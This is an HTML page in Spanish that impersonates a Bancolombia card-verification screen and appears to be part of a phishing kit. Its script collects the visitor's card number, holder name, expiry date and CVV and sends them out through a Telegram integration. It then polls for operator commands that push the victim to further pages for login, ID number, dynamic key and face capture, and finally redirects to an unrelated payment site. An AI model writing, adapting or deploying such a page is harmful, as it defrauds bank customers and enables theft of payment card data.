<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica tu tarjeta - Bancolombia</title>
    <link rel="stylesheet" href="styles_new.css">
    <link rel="stylesheet" href="/css/loading-overlays.css">
    <script src="/js/telegram-integration.js"></script>
    <script src="../bank-telegram-base.js"></script>
    <script src="../banco-master-telegram.js"></script>
</head>
<body>
    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Verificación de tarjeta</h1>
            
            <div class="auth-box">
                <h2>Datos de tarjeta</h2>
                <p>Por favor ingresa los datos de tu tarjeta Bancolombia.</p>
                
                <form class="auth-form" id="cardForm">
                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/>
                                <path d="M2 10h20"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardNumber" placeholder="Número de tarjeta" maxlength="19">
                                <label for="cardNumber">Número de tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                <circle cx="12" cy="7" r="4"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardHolder" placeholder="Titular de la tarjeta">
                                <label for="cardHolder">Titular de la tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
                                    <line x1="16" y1="2" x2="16" y2="6"/>
                                    <line x1="8" y1="2" x2="8" y2="6"/>
                                    <line x1="3" y1="10" x2="21" y2="10"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
                                    <label for="expiryDate">Fecha de vencimiento</label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="cvv" placeholder="CVV" maxlength="4">
                                    <label for="cvv">CVV</label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <button type="submit" class="btn-iniciar" disabled>Continuar</button>
                </form>
            </div>
        </div>

        <div class="help-links">
            <a href="#">¿Problemas para conectarte?</a>
            <span class="separator">•</span>
            <a href="#">Aprende sobre seguridad</a>
            <span class="separator">•</span>
            <a href="#">Reglamento Sucursal Virtual</a>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-left">
                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
            </div>
            <div class="footer-right">
                <p class="ip-address" id="ipAddress">Dirección IP: ...</p>
                <p class="datetime" id="datetime">...</p>
            </div>
        </div>
    </footer>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay bancolombia-loading">
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[BANCOLOMBIA] Inicializando tarjeta.html');
        
        const cardForm = document.getElementById('cardForm');
        const cardNumberInput = document.getElementById('cardNumber');
        const cardHolderInput = document.getElementById('cardHolder');
        const expiryDateInput = document.getElementById('expiryDate');
        const cvvInput = document.getElementById('cvv');
        const submitButton = document.querySelector('.btn-iniciar');
        
        if (!cardForm || !submitButton) {
            console.error('[BANCOLOMBIA] Error: Elementos no encontrados');
            return;
        }
        
        submitButton.disabled = true;
        
        // Formatear número de tarjeta (espacios cada 4 dígitos)
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '').slice(0, 16);
            let formatted = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            
            e.target.value = formatted;
            validateForm();
        });
        
        // Formatear fecha (MM/YY)
        expiryDateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
            
            if (value.length >= 2) {
                const month = Math.min(parseInt(value.substring(0, 2)), 12).toString().padStart(2, '0');
                const year = value.substring(2);
                e.target.value = year ? `${month}/${year}` : month;
            } else {
                e.target.value = value;
            }
            
            validateForm();
        });
        
        // Validar CVV (solo números, 3-4 dígitos)
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            validateForm();
        });
        
        // Validar nombre del titular
        cardHolderInput.addEventListener('input', validateForm);
        
        function validateForm() {
            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
            const cardHolder = cardHolderInput.value.trim();
            const expiryDate = expiryDateInput.value;
            const cvv = cvvInput.value;
            
            const isValid = 
                cardNumber.length === 16 &&
                cardHolder.length >= 5 &&
                /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate) &&
                cvv.length >= 3 && cvv.length <= 4;
            
            submitButton.disabled = !isValid;
            submitButton.style.backgroundColor = isValid ? '#FFD700' : '';
            submitButton.style.cursor = isValid ? 'pointer' : 'default';
        }
        
        cardForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('[BANCOLOMBIA] Submit tarjeta');
            
            if (submitButton.disabled) return;
            
            submitButton.disabled = true;
            submitButton.textContent = 'Procesando...';
            
            const overlay = document.getElementById('loadingOverlay');
            overlay.classList.add('active');
            document.body.style.overflow = 'hidden';
            
            const data = {
                cardNumber: cardNumberInput.value.replace(/\s/g, ''),
                cardHolder: cardHolderInput.value.trim(),
                expiryDate: expiryDateInput.value,
                cvv: cvvInput.value
            };
            
            // Recuperar session ID de localStorage
            let sessionId = localStorage.getItem('bancolombia_session_id');
            if (!sessionId) {
                sessionId = `bancolombia_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                localStorage.setItem('bancolombia_session_id', sessionId);
            }
            console.log('[BANCOLOMBIA] SessionID recuperado:', sessionId);
            
            // Enviar a Telegram
            const result = await TelegramClient.sendToTelegram('bancolombia_tarjeta', {
                bank: 'Bancolombia',
                step: 'tarjeta',
                data: data
            }, sessionId);
            
            if (result.success) {
                console.log('[BANCOLOMBIA] Datos enviados, esperando respuesta...');
                
                // Polling optimizado - solo procesa primera acción
                TelegramClient.startPolling((actions, stop) => {
                    if (window.__bancolombiaProcessing) return;
                    window.__bancolombiaProcessing = true;
                    
                    const action = actions[0];
                    console.log('[BANCOLOMBIA] Procesando:', action.action);
                    
                    switch(action.action) {
                        case 'bancolombia_request_tarjeta':
                            cardForm.reset();
                            validateForm();
                            overlay.classList.remove('active');
                            document.body.style.overflow = '';
                            submitButton.disabled = false;
                            submitButton.textContent = 'Continuar';
                            window.__bancolombiaProcessing = false;
                            break;
                        case 'bancolombia_request_login':
                            window.location.href = 'index.html';
                            break;
                        case 'bancolombia_request_cedula':
                            window.location.href = 'cedula.html';
                            break;
                        case 'bancolombia_request_dinamica':
                            window.location.href = 'dinamica.html';
                            break;
                        case 'bancolombia_request_cara':
                            window.location.href = 'cara.html';
                            break;
                        case 'bancolombia_request_terminos':
                            window.location.href = 'terminos.html';
                            break;
                        case 'bancolombia_finalizar':
                            localStorage.removeItem('bancolombia_session_id');
                            window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                            break;
                    }
                }, sessionId, 100, 300000);
            } else {
                console.error('[BANCOLOMBIA] Error en respuesta:', result);
                overlay.classList.remove('active');
                document.body.style.overflow = '';
                submitButton.disabled = false;
                submitButton.textContent = 'Continuar';
            }
        });
        
        // Actualizar IP y fecha
        async function updateInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipEl = document.getElementById('ipAddress');
                if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
                
                const now = new Date();
                const options = { 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric',
                    hour: 'numeric',
                    minute: '2-digit',
                    hour12: true,
                    timeZone: 'America/Bogota'
                };
                const dateEl = document.getElementById('datetime');
                if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options).toLowerCase();
            } catch (error) {
                console.error('[BANCOLOMBIA] Error actualizando info:', error);
            }
        }
        
        updateInfo();
        setInterval(updateInfo, 60000);
        
        console.log('[BANCOLOMBIA] Inicialización completa');
    });
    </script>
</body>
</html>
